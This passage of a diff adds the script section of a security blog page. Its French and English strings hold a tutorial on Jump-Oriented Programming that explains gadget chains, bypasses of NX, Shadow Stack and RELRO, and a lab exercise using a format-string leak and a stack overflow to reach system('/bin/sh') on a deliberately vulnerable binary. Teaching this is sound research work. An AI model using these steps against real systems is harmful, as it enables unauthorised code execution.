+        </div>
+    </footer>
+
+    <script>
+        function copyToClipboard(elementId, btn) {
+            const textToCopy = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-check"></i> COPIÉ';
+                btn.classList.add('text-green-600');
+                btn.classList.remove('text-gray-500');
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.classList.remove('text-green-600');
+                    btn.classList.add('text-gray-500');
+                }, 2000);
+            });
+        }
+
+        const newsForm = document.getElementById('newsletter-form');
+        const newsBtn = document.getElementById('news-btn');
+        const newsInput = document.getElementById('news-input');
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxpgfOi38v9enff6fwL5n1QPLC_iPz2sXfh0YDiHL5gb5_33qmN1EOyKNqR7FXwt58a/exec';
+
+        if (newsForm) {
+            newsForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                if (newsInput.value) {
+                    const originalText = newsBtn.innerHTML;
+                    newsBtn.innerHTML = "SENDING_ <i class='fas fa-circle-notch fa-spin ml-2'></i>";
+                    let requestBody = new FormData();
+                    requestBody.append('Email', newsInput.value);
+                    fetch(scriptURL, { method: 'POST', body: requestBody, mode: 'no-cors' })
+                        .then(() => {
+                            newsBtn.innerHTML = "TRANSMIS <i class='fas fa-check ml-2'></i>";
+                            newsBtn.classList.remove('bg-white', 'text-black');
+                            newsBtn.classList.add('bg-gray-500', 'text-white');
+                            newsInput.value = '';
+                            setTimeout(() => {
+                                newsBtn.innerHTML = originalText;
+                                newsBtn.classList.add('bg-white', 'text-black');
+                                newsBtn.classList.remove('bg-gray-500', 'text-white');
+                            }, 3000);
+                        })
+                        .catch(() => {
+                            newsBtn.innerHTML = "DONE_";
+                            setTimeout(() => newsBtn.innerHTML = originalText, 3000);
+                        });
+                }
+            });
+        }
+
+        const translations = {
+            fr: {
+                nav_services: "Services", nav_research: "Recherche", nav_blog: "Blog",
+                nav_events: "Events", nav_contact: "Nous contacter",
+                news_title: "Recevoir nos recherches (0-Spam)",
+                news_desc: "Inscrivez-vous à notre flux de transmission sécurisé. Uniquement des writeups techniques, des annonces de CTF et des rapports d'audit publics.",
+                news_btn: "S'abonner_",
+                footer_bio: "Unité de recherche en vulnérabilités avancées et audit de systèmes critiques.",
+                f_link_audit: "Audit de Code Source", f_link_ics: "Systèmes Industriels",
+                f_link_tools: "Outils Open Source",
+                footer_pgp: "Pour toute communication sensible, privilégiez le chiffrement PGP.",
+                btn_copy: "<i class=\"far fa-copy\"></i> COPIER",
+                art_back: "<i class=\"fas fa-arrow-left group-hover:-translate-x-2 transition-transform\"></i> Retour_Archives",
+                art_title: "Exploitation Binaire :<br>\n                <span class=\"text-gray-300\">Jump-Oriented</span><br>\n                Programming.",
+                art_subtitle: "Quand les gadgets sautent sans filet. Une plongée complète dans la technique JOP, son histoire, sa mécanique, son architecture, ses gadgets illustrée par un exercice pratique sur un binaire durci.",
+                art_author_role: "Lead Vulnerability Researcher",
+                art_h2_1: "01 - Origine et motivation",
+                art_h3_1: "Pourquoi le JOP existe",
+                art_p1: "Pour comprendre le JOP, il faut d'abord comprendre ce qu'il cherche à dépasser. Le ROP \"<strong>Return-Oriented Programming</strong>\" est apparu au milieu des années 2000 comme réponse à la protection NX (No-eXecute), qui rend la pile non-exécutable. L'idée était brillante : plutôt que d'injecter du code malveillant, on réutilise du code <em>déjà présent</em> dans le binaire. On appelle ces petits morceaux de code des <strong>gadgets</strong>.",
+                art_p2: "Un gadget ROP est typiquement une séquence de quelques instructions suivie d'un <code>ret</code>. En contrôlant le pointeur de pile <code>RSP</code> via un débordement de tampon, on peut enchaîner des dizaines de gadgets pour construire n'importe quel comportement arbitraire: appeler <code>system(\"/bin/sh\")</code>, effectuer des appels système, mapper de la mémoire exécutable, etc. Le ROP a longtemps été la technique reine de l'exploitation binaire post-NX.",
+                art_quote1: "\"Le ROP a été tellement efficace que les défenseurs ont dû inventer de nouvelles contre-mesures. C'est là que le JOP entre en scène.\"",
+                art_p3: "Des mécanismes comme <strong>Intel CET (Control-flow Enforcement Technology)</strong> et les <strong>Shadow Stacks</strong> ont été conçus précisément pour rendre le ROP inopérant. Le Shadow Stack conserve en hardware une copie séparée et protégée des adresses de retour légitimes. À chaque instruction <code>ret</code>, le processeur compare l'adresse chargée depuis la pile logicielle avec celle présente dans le Shadow Stack. Si les deux ne correspondent pas, une exception matérielle est immédiatement levée, la chaîne ROP est stoppée net.",
+                art_p4: "C'est dans ce contexte que le <strong>Jump-Oriented Programming</strong> a été formalisé. La technique a été présentée par Tyler Bletsch, Xuxian Jiang et al. dans leur papier de 2011 <em>\"Jump-Oriented Programming: A New Class of Code-Reuse Attack\"</em>. La prémisse est d'une simplicité désarmante : <strong>si <code>ret</code> est surveillé, utilisons <code>jmp</code>.</strong>",
+                art_h2_2: "02 - Concept fondamental",
+                art_h3_2: "Ce qu'est réellement le JOP",
+                art_p5: "Le JOP est une technique d'exploitation qui construit un flux d'exécution artificiel en enchaînant des <strong>gadgets terminés par un saut indirect</strong>, typiquement <code>jmp *reg</code> ou <code>call *reg</code> plutôt que par <code>ret</code>. C'est une forme de <strong>Code-Reuse Attack (CRA)</strong> : on ne crée aucun code nouveau, on réorchestre du code légitime déjà présent dans les segments exécutables du binaire ou des bibliothèques chargées.",
+                art_rop_li1: "Gadgets terminés par <code>ret</code>.",
+                art_rop_li2: "<code>RSP</code> est le dispatcher implicite: chaque <code>ret</code> consomme une adresse depuis la pile et y saute",
+                art_rop_li3: "La pile EST la table de dispatch.",
+                art_rop_li4: "Détectable par Shadow Stack : chaque ret est vérifié contre une copie matérielle sécurisée",
+                art_jop_li1: "<span class=\"text-white font-mono font-bold mr-2\">></span> Gadgets terminés par <code>jmp *reg</code>.",
+                art_jop_li2: "<span class=\"text-white font-mono font-bold mr-2\">></span> Un registre dédié est le dispatcher : il pointe vers la prochaine destination",
+                art_jop_li3: "<span class=\"text-white font-mono font-bold mr-2\">></span> Pile absente du mécanisme de dispatch.",
+                art_jop_li4: "<span class=\"text-white font-mono font-bold mr-2\">></span> Invisible pour Shadow Stack.",
+                art_p6: "<strong>L'intuition clé :</strong> en ROP, la pile joue le rôle d'un programme implicite, chaque adresse empilée est la prochaine instruction à exécuter, et <code>RSP</code> est le compteur de programme caché. En JOP, ce rôle est entièrement délégué à un <strong>registre pivot</strong> qu'on contrôle. Le programme n'est plus encodé dans la pile, il est dans les registres. La pile peut même être totalement absente du mécanisme de dispatch.",
+                art_p7: "Cette différence architecturale est ce qui confère au JOP sa résistance aux défenses modernes. Shadow Stack surveille les <code>ret</code>, le JOP n'en émet aucun dans sa chaîne de dispatch.",
+                art_h2_3: "03 - Anatomie d'une chaîne JOP",
+                art_p8: "Une chaîne JOP bien construite s'articule autour de trois types de gadgets aux rôles distincts. Comprendre chacun est indispensable pour concevoir ou analyser un exploit JOP.",
+                art_h3_3_1: "1. Le gadget dispatcher",
+                art_p9: "C'est le cœur du JOP, son équivalent du mécanisme <code>ret</code> en ROP. Le gadget dispatcher est une petite séquence d'instructions dont le seul rôle est de déterminer quel gadget s'exécutera ensuite. Il lit une adresse depuis une <strong>dispatch table</strong> (un tableau d'adresses maintenu en mémoire) et y saute via un <code>jmp</code> indirect. Le pointeur vers cette table est lui-même maintenu dans un registre dédié, que chaque gadget fonctionnel a la responsabilité d'incrémenter avant de repasser la main au dispatcher.",
+                art_h3_3_2: "2. Les gadgets fonctionnels",
+                art_p10: "Ce sont les gadgets qui produisent l'effet désiré : charger une valeur dans un registre, effectuer une opération arithmétique ou logique, préparer un argument pour un appel de fonction, écrire en mémoire, etc. Leur contrainte fondamentale est de se terminer par un <code>jmp *reg</code> idéalement vers le dispatcher, pour poursuivre la chaîne. En pratique, dans les exploits les plus compacts, un registre pivot unique (par exemple <code>r12</code>) joue simultanément le rôle de dispatcher et de cible finale, ce qui simplifie la structure.",
+                art_h3_3_3: "3. Le gadget initiateur (trampoline)",
+                art_p11: "C'est le premier gadget exécuté lors de l'exploitation. Il assure la transition depuis le vecteur d'exploitation initial, un débordement de tampon, un use-after-free, une corruption de pointeur de fonction vers la chaîne JOP proprement dite. Son rôle est d'initialiser les registres clés : le registre pivot qui servira de dispatcher, et éventuellement le pointeur vers la dispatch table. Une fois ces registres mis en place, la chaîne JOP est autonome.",
+                art_p12: "Dans les exploits simples, ce gadget initiateur peut être atteint directement via l'adresse de retour écrasée sur la pile. C'est le seul <code>ret</code> de toute la chaîne, et il est <em>légitime</em> du point de vue du Shadow Stack car il correspond à la frame de la fonction vulnérable.",
+                art_h2_4: "04 - Le modèle de menace JOP",
+                art_h3_4: "Contre quelles protections le JOP est efficace",
+                art_p13: "Voici un bilan honnête du paysage des protections modernes et de la position du JOP face à chacune. Il est important de comprendre que le JOP ne contourne pas tout, il s'inscrit dans une stratégie d'exploitation où d'autres techniques (info leak, heap spray…) comblent les lacunes.",
+                art_li_nx: "<strong>NX / DEP (No-Execute / Data Execution Prevention) :</strong> contourné totalement. Le JOP n'exécute jamais de code injecté, il réutilise uniquement du code présent dans les segments <code>.text</code> du binaire et des bibliothèques chargées.",
+                art_li_aslr: "<strong>ASLR + PIE (randomisation des adresses) :</strong> non contourné directement. Le JOP nécessite de connaître les adresses réelles des gadgets. Une <strong>info leak préalable</strong> est indispensable \" format string, heap info leak, side-channel \" pour calculer la base PIE et les adresses effectives.",
+                art_li_ssp: "<strong>Stack Canary / SSP :</strong> non contourné seul. Si l'exploitation passe par un stack overflow, le canary doit être connu (via une fuite de mémoire) ou contourné (via un autre vecteur). Le JOP ne règle pas ce problème par lui-même.",
+                art_li_shadow: "<strong>Shadow Stack :</strong> contourné efficacement. Aucun <code>ret</code> n'est utilisé dans la chaîne de dispatch JOP. Le Shadow Stack ne voit aucune instruction <code>ret</code> suspecte, la chaîne est invisible pour ce mécanisme.",
+                art_li_relro: "<strong>FULL RELRO (GOT en lecture seule) :</strong> non contourné directement, mais rendu inutile. Avec FULL RELRO, la GOT est résolue au démarrage et marquée read-only. Le JOP n'a pas besoin de l'écraser, si les adresses de fonctions sont connues via un leak, on les appelle directement sans passer par la GOT.",
+                art_p14: "Le JOP est rarement utilisé seul. En pratique, il s'intègre dans une chaîne d'exploitation multi-étapes : une vulnérabilité initiale déclenche un info leak, le leak permet de calculer les adresses réelles, et la chaîne JOP constitue le payload final. C'est la <strong class=\"!text-white\">composition</strong> de ces techniques qui permet de contourner toutes les protections simultanément.",
+                art_h2_5: "05 - Trouver des gadgets JOP",
+                art_h3_5: "La chasse aux gadgets dans un binaire",
+                art_p15: "L'outil de référence pour énumérer les gadgets dans un binaire est <code>ROPgadget</code>, qui dispose d'un mode dédié au JOP. On peut aussi utiliser <code>ropper</code>. Le principe est de scanner toutes les séquences d'octets qui forment des instructions valides et se terminent par un saut indirect.",
+                art_h3_5_2: "Le rôle critique des registres callee-saved",
+                art_p16: "L'ABI System V AMD64 distingue deux catégories de registres selon qui est responsable de les préserver lors d'un appel de fonction. Cette distinction est fondamentale pour le JOP.",
+                art_p17: "Les registres <strong>caller-saved</strong> <code>rax</code>, <code>rcx</code>, <code>rdx</code>, <code>rsi</code>, <code>rdi</code>, <code>r8</code>–<code>r11</code> peuvent être librement modifiés par n'importe quelle fonction appelée. Les registres <strong>callee-saved</strong> <code>rbx</code>, <code>rbp</code>, <code>r12</code>–<code>r15</code> doivent être préservés : toute fonction qui les modifie doit les restaurer avant de retourner.",
+                art_p18: "En pratique pour le JOP, cela signifie qu'une valeur chargée dans <code>r12</code> via un gadget restera intacte à travers des appels de fonctions intermédiaires. <strong>r12 est le registre pivot idéal</strong> : une fois initialisé avec l'adresse d'une cible (par exemple <code>system</code>), il gardera cette valeur jusqu'à la fin de la chaîne.",
+                art_h2_6: "06 - Architecture d'un exploit JOP",
+                art_h3_6: "Du débordement au shell",
+                art_p19: "Un exploit JOP complet suit une architecture en plusieurs phases séquentielles. Chaque phase est une condition nécessaire à la suivante. Comprendre ce pipeline est essentiel pour concevoir un exploit robuste ou pour analyser un exploit existant.",
+                art_flow_1: "Vuln Initiale",
+                art_flow_2: "Info Leak",
+                art_flow_3: "Contrôle PC",
+                art_flow_4: "Gadget Init",
+                art_flow_5: "Chaîne JOP",
+                art_flow_6: "Shell <i class=\"fas fa-terminal text-[10px] ml-1\"></i>",
+                art_li_vuln: "<strong>Vulnérabilité initiale :</strong> le point d'entrée. Typiquement un débordement de tampon sur la pile, un use-after-free, une confusion de type ou une vulnérabilité de format string. Cette étape permet généralement de prendre le contrôle d'un pointeur ou d'une adresse de retour.",
+                art_li_leak: "<strong>Info leak :</strong> étape critique face à ASLR et PIE. On extrait depuis la mémoire du processus au moins deux valeurs : le canary SSP (pour le réécrire intact lors de l'overflow) et une adresse de code (pour calculer la base PIE et donc les adresses réelles de tous les gadgets).",
+                art_li_pc: "<strong>Contrôle du pointeur d'instruction (PC) :</strong> l'overflow permet d'écraser l'adresse de retour de la fonction vulnérable. En plaçant l'adresse du gadget initiateur, on donne le coup d'envoi de la chaîne JOP.",
+                art_li_init: "<strong>Gadget initiateur :</strong> ce gadget charge le registre pivot avec la valeur cible (l'adresse de la fonction à appeler) et enclenche la chaîne. C'est le seul point de la chaîne qui touche à la pile logicielle.",
+                art_li_chain: "<strong>Chaîne JOP :</strong> les gadgets fonctionnels s'exécutent séquentiellement, préparant les arguments nécessaires, configurant les registres, et transmettant le contrôle via des <code>jmp *reg</code> enchaînés sans jamais déclencher le Shadow Stack.",
+                art_li_shell: "<strong>Résultat final :</strong> la fonction cible (<code>system</code>, <code>execve</code>, un appel système direct…) est appelée avec les bons arguments. Un shell est obtenu.",
+                art_h2_7: "07 - Exercice Pratique",
+                art_h3_7: "Application sur un binaire durci",
+                art_p20: "Appliquons maintenant la théorie sur un binaire construit pour mettre en pratique le JOP dans sa forme la plus directe. Toutes les protections modernes sont activées simultanément, le binaire expose deux vulnérabilités intentionnelles, et deux gadgets JOP ont été écrits à la main en assemblage pur pour illustrer le mécanisme.",
+                art_prot_title: "Protections actives",
+                art_obj_title: "Objectif",
+                art_obj_1: "Obtenir <code class=\"bg-gray-800 text-white border-gray-700\">system(\"/bin/sh\")</code>",
+                art_obj_2: "Sans écrire un seul octet de shellcode",
+                art_obj_3: "En enchaînant deux gadgets <code class=\"bg-gray-800 text-white border-gray-700\">jmp</code>",
+                art_h3_7_2: "Les deux vulnérabilités du binaire",
+                art_p21: "La fonction <code>main()</code> appelle séquentiellement deux fonctions vulnérables, nous offrant un pipeline exploit en deux temps : d'abord le leak, ensuite l'overflow.",
+                art_h3_7_3: "L'astuce du constructeur: résoudre system() avant main()",
+                art_p22: "Le binaire contient un constructeur (<code>__attribute__((constructor))</code>) qui s'exécute automatiquement <em>avant</em> <code>main()</code>, avant même que le programme ne soit visible pour l'utilisateur. Ce constructeur appelle <code>system(\"/bin/true\")</code>, une commande inoffensive mais son effet de bord est décisif : il force la résolution de <code>system</code> dans la PLT/GOT dès le démarrage. Même avec Full RELRO, l'adresse réelle de <code>system</code> est ainsi accessible via <code>elf.sym[\"system\"]</code> dès le début de l'exploitation.",
+                art_h3_7_4: "Les gadgets JOP du binaire",
+                art_p23: "Deux fonctions <code>naked</code> sont définies en assemblage pur dans le binaire sans prologue ni épilogue générés par le compilateur. Chaque instruction écrite est exactement ce qui s'exécute. Ces deux gadgets forment la totalité de la chaîne JOP.",
+                art_p24: "<strong>g1</strong> est le gadget chargeur : il pique la prochaine valeur sur la pile avec <code>pop r12</code>, y place l'adresse de <code>system</code>, puis y saute immédiatement avec <code>jmp *r12</code>. Il joue le rôle d'initiateur de la chaîne.",
+                art_p25: "<strong>g2</strong> est le gadget argument : il charge <code>rdi</code>, qui est le premier argument dans la convention d'appel System V AMD64 avec l'adresse de la chaîne <code>/bin/sh</code>, puis saute vers <code>r12</code> qui contient toujours l'adresse de <code>system</code>. L'appel effectif est donc <code>system(\"/bin/sh\")</code>. <code>r12</code> est callee-saved : il a conservé sa valeur à travers tous les gadgets précédents.",
+                art_h3_7_5: "Stage 1 : Info leak via format string",
+                art_p26: "La format string vulnerability dans <code>leak()</code> nous permet de lire des valeurs arbitraires sur la pile en utilisant des spécificateurs de position comme <code>%15$p</code>. En envoyant la bonne chaîne de format, on extrait deux éléments essentiels : le canary SSP et une adresse dans le segment de code du binaire qui nous permettra de calculer la base PIE.",
+                art_h3_7_6: "Stage 2 : Construction du payload JOP",
+                art_p27: "Le buffer overflow dans <code>vuln()</code> nous permet d'écraser la pile au-delà du buffer de 64 octets. Le layout mémoire de la frame est le suivant, on doit atteindre l'adresse de retour en préservant le canary intact :",
+                art_mem_1: "Padding ('A' × 72) - buf[64] + 8 align",
+                art_mem_2: "CANARY (valeur leakée exacte)",
+                art_mem_3: "bypass SSP",
+                art_mem_4: "Saved RBP ('B' × 8) - valeur arbitraire",
+                art_mem_5: "← ret saute ici → entre dans g1",
+                art_mem_6: "← g1 : pop r12 = system",
+                art_mem_7: "← sur la pile quand system reprend",
+                art_mem_8: "← g2 : pop rdi = &\"/bin/sh\"",
+                art_p28: "Le script d'exploitation complet (pwntools) ressemble à ceci :",
+                art_h3_7_7: "Trace d'exécution de la chaîne",
+                art_p29: "Voici ce qui se passe exactement lors de l'exécution du payload, instruction par instruction :",
+                art_trace_1: "<strong>ret dans vuln() :</strong> RSP pointe sur <code>addr(g1)</code>. Le CPU charge cette adresse et y saute. On entre dans g1.",
+                art_trace_2: "<strong>g1 : pop r12 :</strong> la valeur au sommet de la pile (<code>addr(system)</code>, +0x60) est chargée dans <code>r12</code>. RSP avance à +0x68.",
+                art_trace_3: "<strong>g1 : jmp *r12 :</strong> le CPU saute vers <code>system</code>. RSP pointe sur +0x68 (<code>addr(g2)</code>). La pile est dans cet état lorsque <code>system</code> commence à s'exécuter.",
+                art_trace_4: "<strong>system reprend le contrôle de la pile :</strong> lors de son exécution interne, <code>system</code> consomme RSP et finit par retransférer le contrôle vers ce que la pile indique. Ici <code>addr(g2)</code>. On entre dans g2.",
+                art_trace_5: "<strong>g2 : pop rdi :</strong> l'adresse de <code>\"/bin/sh\"</code> est chargée dans <code>rdi</code>, le premier argument selon l'ABI System V.",
+                art_trace_6: "<strong>g2 : jmp *r12 :</strong> <code>r12</code> est callee-saved et contient toujours <code>addr(system)</code>. L'appel effectif est <code>system(\"/bin/sh\")</code>. Le shell est obtenu.",
+                art_bypass_title: "// BILAN PROTECTIONS CONTOURNÉES",
+                art_bypass_nx: "aucun shellcode, uniquement du code existant dans <code class=\"text-gray-300 text-[11px]\">.text</code>",
+                art_bypass_pie: "base calculée grâce au leak format string",
+                art_bypass_ssp: "valeur leakée et réécrite identique",
+                art_bypass_relro: "GOT jamais touchée, appel direct via adresse leakée",
+                art_bypass_shadow: "aucun <code class=\"text-gray-300 text-[11px]\">ret</code> dans la chaîne JOP, mécanisme invisible",
+                art_h2_8: "08 - Références"
+            },
+            en: {
+                nav_services: "Services", nav_research: "Research", nav_blog: "Blog",
+                nav_events: "Events", nav_contact: "Contact Us",
+                news_title: "Receive our research (0-Spam)",
+                news_desc: "Subscribe to our secure transmission feed. Strictly technical writeups, CTF announcements, and public audit reports.",
+                news_btn: "Subscribe_",
+                footer_bio: "Advanced vulnerability research unit and critical systems auditing.",
+                f_link_audit: "Source Code Audit", f_link_ics: "Industrial Systems",
+                f_link_tools: "Open Source Tools",
+                footer_pgp: "For all sensitive communication, please use PGP encryption.",
+                btn_copy: "<i class=\"far fa-copy\"></i> COPY",
+                art_back: "<i class=\"fas fa-arrow-left group-hover:-translate-x-2 transition-transform\"></i> Back_Archives",
+                art_title: "Binary Exploitation :<br>\n                <span class=\"text-gray-300\">Jump-Oriented</span><br>\n                Programming.",
+                art_subtitle: "When gadgets jump without a net. A complete dive into the JOP technique, its history, mechanics, architecture, and gadgets, illustrated by a practical exercise on a hardened binary.",
+                art_author_role: "Lead Vulnerability Researcher",
+                art_h2_1: "01 - Origin and motivation",
+                art_h3_1: "Why JOP exists",
+                art_p1: "To understand JOP, we first need to understand what it tries to bypass. ROP (<strong>Return-Oriented Programming</strong>) appeared in the mid-2000s as a response to NX (No-eXecute) protection, which makes the stack non-executable. The idea was brilliant: rather than injecting malicious code, we reuse code <em>already present</em> in the binary. These small pieces of code are called <strong>gadgets</strong>.",
+                art_p2: "A ROP gadget is typically a sequence of a few instructions followed by a <code>ret</code>. By controlling the stack pointer <code>RSP</code> via a buffer overflow, we can chain dozens of gadgets to build any arbitrary behavior: call <code>system(\"/bin/sh\")</code>, perform system calls, map executable memory, etc. ROP has long been the king of post-NX binary exploitation.",
+                art_quote1: "\"ROP was so effective that defenders had to invent new countermeasures. This is where JOP comes into play.\"",
+                art_p3: "Mechanisms like <strong>Intel CET (Control-flow Enforcement Technology)</strong> and <strong>Shadow Stacks</strong> were designed specifically to render ROP useless. The Shadow Stack maintains a separate, hardware-protected copy of legitimate return addresses. On every <code>ret</code> instruction, the processor compares the address loaded from the software stack with the one in the Shadow Stack. If they don't match, a hardware exception is immediately raised, stopping the ROP chain dead in its tracks.",
+                art_p4: "It is in this context that <strong>Jump-Oriented Programming</strong> was formalized. The technique was presented by Tyler Bletsch, Xuxian Jiang et al. in their 2011 paper <em>\"Jump-Oriented Programming: A New Class of Code-Reuse Attack\"</em>. The premise is disarmingly simple: <strong>if <code>ret</code> is monitored, let's use <code>jmp</code>.</strong>",
+                art_h2_2: "02 - Fundamental concept",
+                art_h3_2: "What JOP really is",
+                art_p5: "JOP is an exploitation technique that builds an artificial execution flow by chaining <strong>gadgets ending with an indirect jump</strong>, typically <code>jmp *reg</code> or <code>call *reg</code> rather than <code>ret</code>. It is a form of <strong>Code-Reuse Attack (CRA)</strong>: we do not create any new code, we re-orchestrate legitimate code already present in the binary's executable segments or loaded libraries.",
+                art_rop_li1: "Gadgets ending in <code>ret</code>.",
+                art_rop_li2: "<code>RSP</code> is the implicit dispatcher: each <code>ret</code> consumes an address from the stack and jumps to it.",
+                art_rop_li3: "The stack IS the dispatch table.",
+                art_rop_li4: "Detectable by Shadow Stack: each ret is checked against a secure hardware copy.",
+                art_jop_li1: "<span class=\"text-white font-mono font-bold mr-2\">></span> Gadgets ending in <code>jmp *reg</code>.",
+                art_jop_li2: "<span class=\"text-white font-mono font-bold mr-2\">></span> A dedicated register is the dispatcher: it points to the next destination.",
+                art_jop_li3: "<span class=\"text-white font-mono font-bold mr-2\">></span> Stack absent from the dispatch mechanism.",
+                art_jop_li4: "<span class=\"text-white font-mono font-bold mr-2\">></span> Invisible to Shadow Stack.",
+                art_p6: "<strong>The key intuition:</strong> in ROP, the stack acts as an implicit program, each pushed address is the next instruction to execute, and <code>RSP</code> is the hidden program counter. In JOP, this role is entirely delegated to a <strong>pivot register</strong> that we control. The program is no longer encoded in the stack, it is in the registers. The stack can even be completely absent from the dispatch mechanism.",
+                art_p7: "This architectural difference is what gives JOP its resistance to modern defenses. Shadow Stack monitors <code>ret</code>s, JOP issues none in its dispatch chain.",
+                art_h2_3: "03 - Anatomy of a JOP chain",
+                art_p8: "A well-constructed JOP chain is built around three types of gadgets with distinct roles. Understanding each is essential to design or analyze a JOP exploit.",
+                art_h3_3_1: "1. The dispatcher gadget",
+                art_p9: "This is the heart of JOP, its equivalent to the <code>ret</code> mechanism in ROP. The dispatcher gadget is a small sequence of instructions whose sole role is to determine which gadget will execute next. It reads an address from a <strong>dispatch table</strong> (an array of addresses maintained in memory) and jumps to it via an indirect <code>jmp</code>. The pointer to this table is itself maintained in a dedicated register, which each functional gadget is responsible for incrementing before handing control back to the dispatcher.",
+                art_h3_3_2: "2. The functional gadgets",
+                art_p10: "These are the gadgets that produce the desired effect: loading a value into a register, performing an arithmetic or logical operation, preparing an argument for a function call, writing to memory, etc. Their fundamental constraint is to end with a <code>jmp *reg</code> ideally towards the dispatcher, to continue the chain. In practice, in the most compact exploits, a single pivot register (for example <code>r12</code>) simultaneously plays the role of dispatcher and final target, which simplifies the structure.",
+                art_h3_3_3: "3. The initiator gadget (trampoline)",
+                art_p11: "This is the first gadget executed during exploitation. It provides the transition from the initial exploitation vector (a buffer overflow, a use-after-free, a corrupted function pointer) to the JOP chain itself. Its role is to initialize the key registers: the pivot register that will serve as dispatcher, and potentially the pointer to the dispatch table. Once these registers are set up, the JOP chain is autonomous.",
+                art_p12: "In simple exploits, this initiator gadget can be reached directly via the overwritten return address on the stack. This is the only <code>ret</code> in the entire chain, and it is <em>legitimate</em> from the Shadow Stack's point of view because it corresponds to the vulnerable function's frame.",
+                art_h2_4: "04 - The JOP threat model",
+                art_h3_4: "Against which protections JOP is effective",
+                art_p13: "Here is an honest assessment of the modern protection landscape and JOP's position against each. It is important to understand that JOP does not bypass everything; it is part of an exploitation strategy where other techniques (info leak, heap spray...) fill the gaps.",
+                art_li_nx: "<strong>NX / DEP (No-Execute / Data Execution Prevention):</strong> completely bypassed. JOP never executes injected code, it only reuses code present in the <code>.text</code> segments of the binary and loaded libraries.",
+                art_li_aslr: "<strong>ASLR + PIE (address randomization):</strong> not bypassed directly. JOP requires knowing the real addresses of the gadgets. A <strong>prior info leak</strong> is essential (format string, heap info leak, side-channel) to calculate the PIE base and effective addresses.",
+                art_li_ssp: "<strong>Stack Canary / SSP:</strong> not bypassed alone. If the exploit uses a stack overflow, the canary must be known (via a memory leak) or bypassed (via another vector). JOP does not solve this problem on its own.",
+                art_li_shadow: "<strong>Shadow Stack:</strong> effectively bypassed. No <code>ret</code> is used in the JOP dispatch chain. The Shadow Stack sees no suspicious <code>ret</code> instructions; the chain is invisible to this mechanism.",
+                art_li_relro: "<strong>FULL RELRO (read-only GOT):</strong> not bypassed directly, but rendered useless. With FULL RELRO, the GOT is resolved at startup and marked read-only. JOP doesn't need to overwrite it; if function addresses are known via a leak, they are called directly without going through the GOT.",
+                art_p14: "JOP is rarely used alone. In practice, it integrates into a multi-stage exploitation chain: an initial vulnerability triggers an info leak, the leak allows calculating real addresses, and the JOP chain constitutes the final payload. It is the <strong class=\"!text-white\">composition</strong> of these techniques that allows bypassing all protections simultaneously.",
+                art_h2_5: "05 - Finding JOP gadgets",
+                art_h3_5: "Hunting for gadgets in a binary",
+                art_p15: "The reference tool for enumerating gadgets in a binary is <code>ROPgadget</code>, which has a dedicated JOP mode. <code>ropper</code> can also be used. The principle is to scan all byte sequences that form valid instructions and end with an indirect jump.",
+                art_h3_5_2: "The critical role of callee-saved registers",
+                art_p16: "The AMD64 System V ABI distinguishes two categories of registers depending on who is responsible for preserving them during a function call. This distinction is fundamental for JOP.",
+                art_p17: "<strong>Caller-saved</strong> registers <code>rax</code>, <code>rcx</code>, <code>rdx</code>, <code>rsi</code>, <code>rdi</code>, <code>r8</code>–<code>r11</code> can be freely modified by any called function. <strong>Callee-saved</strong> registers <code>rbx</code>, <code>rbp</code>, <code>r12</code>–<code>r15</code> must be preserved: any function that modifies them must restore them before returning.",
+                art_p18: "In practice for JOP, this means a value loaded into <code>r12</code> via a gadget will remain intact across intermediate function calls. <strong>r12 is the ideal pivot register</strong>: once initialized with a target address (for example <code>system</code>), it will keep this value until the end of the chain.",
+                art_h2_6: "06 - Architecture of a JOP exploit",
+                art_h3_6: "From overflow to shell",
+                art_p19: "A complete JOP exploit follows a sequential multi-phase architecture. Each phase is a necessary condition for the next. Understanding this pipeline is essential to design a robust exploit or analyze an existing one.",
+                art_flow_1: "Initial Vuln",
+                art_flow_2: "Info Leak",
+                art_flow_3: "PC Control",
+                art_flow_4: "Init Gadget",
+                art_flow_5: "JOP Chain",
+                art_flow_6: "Shell <i class=\"fas fa-terminal text-[10px] ml-1\"></i>",
+                art_li_vuln: "<strong>Initial vulnerability:</strong> the entry point. Typically a stack buffer overflow, use-after-free, type confusion, or format string vulnerability. This step generally allows taking control of a pointer or a return address.",
+                art_li_leak: "<strong>Info leak:</strong> a critical step against ASLR and PIE. We extract at least two values from the process memory: the SSP canary (to rewrite it intact during the overflow) and a code address (to calculate the PIE base and therefore the real addresses of all gadgets).",
+                art_li_pc: "<strong>Instruction Pointer (PC) control:</strong> the overflow allows overwriting the return address of the vulnerable function. By placing the address of the initiator gadget, we kick off the JOP chain.",
+                art_li_init: "<strong>Initiator gadget:</strong> this gadget loads the pivot register with the target value (the address of the function to call) and starts the chain. This is the only point in the chain that touches the software stack.",
+                art_li_chain: "<strong>JOP chain:</strong> the functional gadgets execute sequentially, preparing the necessary arguments, configuring registers, and passing control via chained <code>jmp *reg</code> without ever triggering the Shadow Stack.",
+                art_li_shell: "<strong>Final result:</strong> the target function (<code>system</code>, <code>execve</code>, a direct syscall...) is called with the right arguments. A shell is obtained.",
+                art_h2_7: "07 - Practical Exercise",
+                art_h3_7: "Application on a hardened binary",
+                art_p20: "Let's now apply the theory on a binary built to practice JOP in its most direct form. All modern protections are activated simultaneously, the binary exposes two intentional vulnerabilities, and two JOP gadgets were written by hand in pure assembly to illustrate the mechanism.",
+                art_prot_title: "Active Protections",
+                art_obj_title: "Objective",
+                art_obj_1: "Get <code class=\"bg-gray-800 text-white border-gray-700\">system(\"/bin/sh\")</code>",
+                art_obj_2: "Without writing a single byte of shellcode",
+                art_obj_3: "By chaining two <code class=\"bg-gray-800 text-white border-gray-700\">jmp</code> gadgets",
+                art_h3_7_2: "The two vulnerabilities of the binary",
+                art_p21: "The <code>main()</code> function sequentially calls two vulnerable functions, offering us a two-stage exploit pipeline: first the leak, then the overflow.",
+                art_h3_7_3: "The constructor trick: resolving system() before main()",
